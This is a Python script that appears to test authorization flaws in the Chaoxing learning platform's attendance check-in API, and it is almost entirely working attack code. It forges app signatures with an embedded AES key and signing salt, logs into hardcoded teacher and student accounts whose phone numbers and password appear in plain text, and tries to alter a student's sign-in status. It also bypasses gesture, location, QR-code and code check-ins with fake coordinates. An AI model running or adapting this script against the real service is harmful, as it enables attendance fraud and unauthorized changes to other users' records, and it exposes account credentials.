import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def mobile_login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = "修改成功" in detail or "success" in evidence.lower()[:100] or "签到成功" in detail
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"签到状态修改漏洞最终验证 - 创建活动+updateSignStatus+V2 API")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = mobile_login("19712720708", "3.1415926Cpy")
    s_s, puid_s = mobile_login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n[2] 获取签到活动列表...")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
    print(f"  找到 {len(active_ids)} 个签到活动")

    print("\n" + "=" * 80)
    print("[3] 创建新的普通签到活动（进行中）")
    print("=" * 80)

    new_aid = None
    create_attempts = [
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试签到"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "测试", "ifTiJiao": "1"},
        {"courseId": COURSE_ID, "clazzId": CLASS_ID, "activeType": "2", "title": "测试"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "测试", "duration": "5"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "测试", "startTime": "", "endTime": ""},
    ]

    for i, params in enumerate(create_attempts):
        r = s_t.post(f"{base}/ppt/activeAPI/createActive",
                     data=params, headers=ajax_hdr, timeout=20)
        d = safe_json(r)
        print(f"  尝试{i+1}: params={params}, result={json.dumps(d, ensure_ascii=False)[:200]}")
        if isinstance(d, dict) and d.get("result"):
            aid = str(d.get("result", ""))
            if aid and aid != "0" and len(aid) > 5:
                new_aid = aid
                print(f"  ✅ 新签到活动ID: {new_aid}")
                break

    if not new_aid:
        print("  ❌ 无法创建新签到活动")
        print("  尝试使用V2 API创建...")
        r = s_t.post(f"{base}/v2/apis/active/createActive",
                     data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "测试"},
                     headers=ajax_hdr, timeout=20)
        print(f"  V2创建: HTTP {r.status_code}, {r.text[:200]}")

    if new_aid:
        print("\n" + "=" * 80)
        print(f"[4] 使用新活动ID={new_aid}测试updateSignStatus")
        print("=" * 80)

        r = s_t.post(f"{base}/pptSign/updateSignStatus",
                     data={"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_t, "studentId": puid_s, "status": "1"},
                     headers=ajax_hdr, timeout=20)
        rec("T4-01", f"教师 updateSignStatus(新活动): {r.text[:100]}", r.text[:300])

        r = s_s.post(f"{base}/pptSign/updateSignStatus",
                     data={"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s, "studentId": puid_s, "status": "1"},
                     headers=ajax_hdr, timeout=20)
        rec("T4-02", f"学生 updateSignStatus(新活动): {r.text[:100]}", r.text[:300])

        print("\n" + "=" * 80)
        print(f"[5] 使用新活动ID={new_aid}测试V2 signIn API")
        print("=" * 80)

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": new_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        rec("T5-01", f"学生V2 signIn(新活动): {json.dumps(d, ensure_ascii=False)[:200]}", json.dumps(d, ensure_ascii=False)[:500])

        print("\n" + "=" * 80)
        print(f"[6] 使用新活动ID={new_aid}测试stuSignajax")
        print("=" * 80)

        r = s_s.get(f"{base}/pptSign/stuSignajax",
                    params={"activeId": new_aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                            "longitude": "-1", "appType": "15", "fid": "0"},
                    timeout=20)
        rec("T6-01", f"学生stuSignajax(新活动): {r.text[:100]}", r.text[:300])

        print("\n" + "=" * 80)
        print(f"[7] 验证签到状态是否改变")
        print("=" * 80)

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": new_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            data = d["data"]
            rec("T7-01", f"签到状态: id={data.get('id')}, status={data.get('status')}, "
                f"lat={data.get('latitude')}, lng={data.get('longitude')}, "
                f"create={data.get('createtime')}, update={data.get('updatetime')}",
                json.dumps(data, ensure_ascii=False)[:500])

        r = s_t.get(f"{base}/pptSign/signedResult",
                    params={"activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
                    headers={"Referer": f"{base}/"}, timeout=20)
        rec("T7-02", f"教师signedResult(新活动): HTTP {r.status_code}, len={len(r.text)}, {r.text[:200]}", r.text[:500])

        print("\n" + "=" * 80)
        print(f"[8] 结束新创建的签到活动")
        print("=" * 80)

        r = s_t.post(f"{base}/ppt/activeAPI/endSign",
                     data={"activeId": new_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                     headers=ajax_hdr, timeout=20)
        rec("T8-01", f"结束签到: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[9] 签到类型绕过 - stuSignajax对不同签到类型的处理")
    print("=" * 80)

    for act in active_ids:
        aid = act["id"]
        atype = act["type"]
        name = act["name"]
        type_names = {"2": "普通签到", "3": "手势签到", "4": "位置签到", "5": "二维码签到", "6": "签到码签到"}
        type_name = type_names.get(atype, f"未知({atype})")

        r = s_s.get(f"{base}/pptSign/stuSignajax",
                    params={"activeId": aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                            "longitude": "-1", "appType": "15", "fid": "0"},
                    timeout=20)
        rec(f"T9-{aid[:8]}", f"[{type_name}] stuSignajax: {r.text[:100]}", r.text[:300])

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        v2_result = d.get("result", "?")
        v2_error = d.get("errorMsg", "")
        rec(f"T9-v2-{aid[:8]}", f"[{type_name}] V2 signIn: result={v2_result}, error={v2_error}")

    print("\n" + "=" * 80)
    print("[10] updateSignStatus - 对已有签到记录的活动测试")
    print("=" * 80)

    for act in active_ids[:5]:
        aid = act["id"]
        atype = act["type"]
        r_v2 = s_s.get(f"{base}/v2/apis/sign/signIn",
                       params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                       timeout=20)
        d_v2 = safe_json(r_v2)
        if d_v2.get("result") == 1 and isinstance(d_v2.get("data"), dict):
            current_status = d_v2["data"].get("status", "?")

            for target_status in ["0", "3", "4", "5", "6"]:
                r = s_t.post(f"{base}/pptSign/updateSignStatus",
                             data={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                   "uid": puid_t, "studentId": puid_s, "status": target_status},
                             headers=ajax_hdr, timeout=20)
                rec(f"T10-{aid[:8]}-s{target_status}", f"教师 updateSignStatus(current={current_status}, target={target_status}): {r.text[:100]}", r.text[:300])

                r = s_s.post(f"{base}/pptSign/updateSignStatus",
                             data={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                   "uid": puid_s, "studentId": puid_s, "status": target_status},
                             headers=ajax_hdr, timeout=20)
                rec(f"T10-{aid[:8]}-s{target_status}-s", f"学生 updateSignStatus(current={current_status}, target={target_status}): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[11] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "final_sign_vuln_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if "修改成功" in r.get("detail", "") or "修改成功" in r.get("evidence", ""))
    fail = sum(1 for r in results if "修改失败" in r.get("detail", "") or "修改失败" in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  修改成功: {success}, 修改失败: {fail}, 无权限: {perm}")

if __name__ == "__main__":
    run()
